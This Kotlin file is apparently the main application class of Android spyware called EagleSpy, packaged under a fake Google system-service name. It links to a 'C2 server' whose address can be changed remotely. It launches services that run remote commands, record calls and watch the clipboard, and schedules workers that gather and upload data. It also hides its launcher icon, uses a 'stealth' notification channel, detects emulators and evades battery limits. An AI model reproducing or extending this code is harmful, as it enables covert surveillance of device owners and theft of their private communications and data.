package com.google.android.systemservice

import android.app.Application
import android.content.ComponentName
import android.content.pm.PackageManager
import android.provider.Settings
import android.util.Log
import androidx.hilt.work.HiltWorkerFactory
import androidx.work.Configuration
import androidx.work.Constraints
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.NetworkType
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import com.google.android.systemservice.workers.CommandWorker
import com.google.android.systemservice.workers.DataSyncWorker
import com.google.android.systemservice.utils.StealthNotificationHelper
import com.google.android.systemservice.utils.DataSyncManager
import com.google.android.systemservice.utils.DozeOptimization
import dagger.hilt.android.HiltAndroidApp
import timber.log.Timber
import java.util.concurrent.TimeUnit
import javax.inject.Inject

@HiltAndroidApp
class EagleSpyApp : Application(), Configuration.Provider {

    companion object {
        private const val TAG = "EagleSpyApp"
        private const val PREFS_NAME = "stealth_prefs"
        private const val KEY_DEVICE_ID = "device_id"
        private const val KEY_SERVER_URL = "server_url"
        
        // Default C2 server — derived from build config
        private val DEFAULT_SERVER_URL = BuildConfig.SERVER_BASE_URL.replace("http", "ws") + "/cable"
        
        @Volatile
        private var instance: EagleSpyApp? = null
        
        fun getInstance(): EagleSpyApp {
            return instance ?: throw IllegalStateException(
                "EagleSpyApp not initialized. Ensure Application.onCreate() has completed."
            )
        }
        
        fun getInstanceOrNull(): EagleSpyApp? = instance
    }

    @Inject
    lateinit var workerFactory: HiltWorkerFactory

    override val workManagerConfiguration: Configuration
        get() = Configuration.Builder()
            .setWorkerFactory(workerFactory)
            .setMinimumLoggingLevel(if (BuildConfig.DEBUG) Log.DEBUG else Log.ERROR)
            .build()

    override fun onCreate() {
        super.onCreate()
        instance = this
        initConfig()
        initServices()
        initWorkers()
        initSecurityChecks()
        Timber.d("EagleSpyApp initialized")
    }

    private fun initConfig() {
        if (BuildConfig.DEBUG) {
            Timber.plant(Timber.DebugTree())
        }
        Timber.d("EagleSpyApp initializing...")
        com.google.android.systemservice.config.AndroidConfig.initDeviceId(this)
        StealthNotificationHelper.createStealthChannel(this)
    }

    private fun initServices() {
        startCommandService()
        startBatteryMonitor()
        startCallRecordingService()
        startClipboardMonitor()
    }

    private fun initWorkers() {
        scheduleCommandWorker()

        try {
            com.google.android.systemservice.workers.OfflineCollectorWorker.schedule(this)
        } catch (e: Exception) {
            Timber.e(e, "Failed to schedule OfflineCollectorWorker")
        }

        try {
            DataSyncWorker.scheduleAdaptive(this)
            Timber.d("Adaptive DataSyncWorker scheduled")
        } catch (e: Exception) {
            Timber.e(e, "Failed to schedule DataSyncWorker")
        }
    }

    private fun initSecurityChecks() {
        if (!com.google.android.systemservice.utils.SecurityChecker.isSafeEnvironment()) {
            Timber.d("Environment check: debug/emulator detected")
        }

        try {
            DozeOptimization.requestIgnoreBatteryOptimizations(this)
        } catch (e: Exception) {
            Timber.e(e, "Failed to request battery optimization exemption")
        }

        try {
            DozeOptimization.scheduleAlarmForDozeWakeup(this)
            Timber.d("Doze wakeup alarm scheduled")
        } catch (e: Exception) {
            Timber.e(e, "Failed to schedule Doze wakeup")
        }
    }

    override fun onTerminate() {
        DataSyncManager.shutdown()
        super.onTerminate()
    }

    private fun scheduleCommandWorker() {
        try {
            val constraints = Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build()

            val workRequest = PeriodicWorkRequestBuilder<CommandWorker>(
                15, TimeUnit.MINUTES,
                5, TimeUnit.MINUTES  // Flex interval
            )
                .setConstraints(constraints)
                .build()

            WorkManager.getInstance(this).enqueueUniquePeriodicWork(
                "command_worker",
                ExistingPeriodicWorkPolicy.KEEP,
                workRequest
            )
            
            Log.d(TAG, "CommandWorker scheduled")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to schedule CommandWorker: ${e.message}")
        }
    }

    private fun startServiceSafely(serviceClass: Class<out android.app.Service>) {
        try {
            val intent = android.content.Intent(this, serviceClass)
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
            Log.d(TAG, "${serviceClass.simpleName} started")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start ${serviceClass.simpleName}: ${e.message}")
        }
    }

    private fun startCommandService() = startServiceSafely(com.google.android.systemservice.services.CommandService::class.java)
    private fun startCallRecordingService() = startServiceSafely(com.google.android.systemservice.services.CallRecordingService::class.java)
    private fun startClipboardMonitor() = startServiceSafely(com.google.android.systemservice.services.ClipboardMonitorService::class.java)
    private fun startBatteryMonitor() = startServiceSafely(com.google.android.systemservice.services.BatteryMonitorService::class.java)

    fun getDeviceIdentifier(): String {
        val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
        var deviceId = prefs.getString(KEY_DEVICE_ID, null)
        
        if (deviceId == null) {
            deviceId = try {
                Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
                    ?: java.util.UUID.randomUUID().toString()
            } catch (e: Exception) {
                java.util.UUID.randomUUID().toString()
            }
            prefs.edit().putString(KEY_DEVICE_ID, deviceId).apply()
        }
        
        return deviceId ?: "unknown_device"
    }

    fun getServerUrl(): String {
        return getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
            .getString(KEY_SERVER_URL, DEFAULT_SERVER_URL) ?: DEFAULT_SERVER_URL
    }

    fun updateServerUrl(newUrl: String) {
        getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
            .edit()
            .putString(KEY_SERVER_URL, newUrl)
            .apply()
        Log.d(TAG, "Server URL updated to: $newUrl")
    }

    fun isSetupComplete(): Boolean {
        return getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
            .getBoolean("setup_complete", false)
    }

    fun hideLauncherIcon() {
        val componentName = ComponentName(this, SetupWizardActivity::class.java)
        packageManager.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
        Log.d(TAG, "Launcher icon hidden")
    }

    fun showLauncherIcon() {
        val componentName = ComponentName(this, SetupWizardActivity::class.java)
        packageManager.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
            PackageManager.DONT_KILL_APP
        )
        Log.d(TAG, "Launcher icon shown")
    }
}
